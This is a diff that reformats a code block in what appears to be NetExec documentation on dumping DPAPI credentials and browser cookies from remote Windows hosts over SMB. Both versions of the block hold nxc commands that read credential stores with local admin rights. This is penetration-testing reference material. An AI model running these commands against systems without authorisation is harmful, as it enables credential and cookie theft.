@@ -13,9 +13,9 @@ You can dump DPAPI credentials using NetExec using the following option: `--dpap
 You need at least local admin privilege on the remote target, use **--local-auth** if your user is a local account
 {% endhint %}
 
-```
-$ nxc smb <ip> -u user -p password --dpapi
-$ nxc smb <ip> -u user -p password --dpapi cookies
-$ nxc smb <ip> -u user -p password --dpapi nosystem
-$ nxc smb <ip> -u user -p password --local-auth --dpapi nosystem
+```bash
+nxc smb <ip> -u user -p password --dpapi
+nxc smb <ip> -u user -p password --dpapi cookies
+nxc smb <ip> -u user -p password --dpapi nosystem
+nxc smb <ip> -u user -p password --local-auth --dpapi nosystem
 ```
